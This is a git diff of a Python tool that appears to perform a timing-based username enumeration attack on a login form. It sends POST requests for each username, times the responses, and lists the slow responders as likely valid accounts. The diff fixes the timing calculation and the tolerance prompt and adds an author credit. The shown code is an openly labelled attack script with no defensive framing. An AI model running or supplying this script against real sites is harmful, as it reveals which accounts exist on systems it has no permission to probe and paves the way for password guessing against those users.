@@ -4,35 +4,11 @@ import json
 from tqdm import tqdm
 import sys
 
-art="""
-                                                                                                                                       _.--,-```-.    
-                                                 ,--.                                                                                 /    /      '.  
-             .---.   ,---,                   ,--/  /|             ,--,      ,--,                               ,---,         ,---,.  /  ../         ; 
-            /. ./| ,--.' |                ,---,': / '   ,--,    ,--.'|    ,--.'|                     ,---,   .'  .' `\     ,'  .'  \ \  ``\  .``-    '
-        .--'.  ' ; |  |  :        ,---.   :   : '/ /  ,--.'|    |  | :    |  | :                   ,---.'| ,---.'     \  ,---.' .' |  \ ___\/    \   :
-       /__./ \ : | :  :  :       '   ,'\  |   '   ,   |  |,     :  : '    :  : '                   |   | : |   |  .`\  | |   |  |: |        \    :   |
-   .--'.  '   \' . :  |  |,--.  /   /   | '   |  /    `--'_     |  ' |    |  ' |       ,---.       |   | | :   : |  '  | :   :  :  /        |    ;  . 
-  /___/ \ |    ' ' |  :  '   | .   ; ,. : |   ;  ;    ,' ,'|    '  | |    '  | |      /     \    ,--.__| | |   ' '  ;  : :   |    ;        ;   ;   :  
-  ;   \  \;      : |  |   /' : '   | |: : :   '   \   '  | |    |  | :    |  | :     /    /  |  /   ,'   | '   | ;  .  | |   :     \      /   :   :   
-   \   ;  `      | '  :  | | | '   | .; : |   |    '  |  | :    '  : |__  '  : |__  .    ' / | .   '  /  | |   | :  |  ' |   |   . |      `---'.  |   
-    .   \    .\  ; |  |  ' | : |   :    | '   : |.  \ '  : |__  |  | '.'| |  | '.'| '   ;   /| '   ; |:  | '   : | /  ;  '   :  '; |       `--..`;    
-     \   \   ' \ | |  :  :_:,'  \   \  /  |   | '_\.' |  | '.'| ;  :    ; ;  :    ; '   |  / | |   | '/  ' |   | '` ,/   |   |  | ;      .--,_        
-      :   '  |--"  |  | ,'       `----'   '   : |     ;  :    ; |  ,   /  |  ,   /  |   :    | |   :    :| ;   :  .'     |   :   /       |    |`.     
-       \   \ ;     `--''                  ;   |,'     |  ,   /   ---`-'    ---`-'    \   \  /   \   \  /   |   ,.'       |   | ,'        `-- -`, ;    
-        '---"                             '---'        ---`-'                         `----'     `----'    '---'         `----'            '---`"     
-                                                                                                                                                                                                                                                                                                                                                                                                                      
+whoami="""
+[+] Coded By : WhoKilledDB?
+[+] Github Link TO Repositotry : https://github.com/whokilleddb/timingattack
 """
-print(art)
-
-
-
-
-
-
-
-
-
-
+print("\033[1m\033[01;35m"+whoami+"\033[00m")
 
 
 try : 
@@ -55,7 +31,7 @@ def tryLogin(user):
         print("[+] Error : ", response.status_code)
 
 
-print("[+] Starting Attack")
+print("[+] Performing Checks")
 
 
 try : 
@@ -64,26 +40,30 @@ except Exception as e :
     print(f"[-] Error Raised As : {e}")
     sys.exit(-1)
 
+print("[+] CHECKS OK")
+print("[+] Starting Attack")
+
 for user in tqdm(usernames,desc="[+] Sending POST requests " , unit=" Usernames"):
     start=time.time()
     tryLogin(user)
     stop=time.time()
-    intervals[user]=start-stop
+    intervals[user]=stop-start
     time.sleep(0.01)
 
 print("[+] Finished Attack")
 
-tolerence = 0.9
 
 largest=max(intervals.values())
 smallest=min(intervals.values())
 delta=largest-smallest
 
 print(f"[+] Delta = {delta}")
+tolerence = 100
+while tolerence > 1 or tolerence < 0 :
+    tolerence=float(input("[+] Enter Tolerence Value : "))
 
-while tolerence <= 1 and tolerence >0 :
-    tolerence=input("[+] Enter Tolerence Value : ")
+print(f"[+] Tolerence Set To : {tolerence}")
 
 for user,time in intervals.items():
-    if time >=delta*tolerence:
+    if time >= largest*tolerence:
         print(f"[+] {user} : {time}")
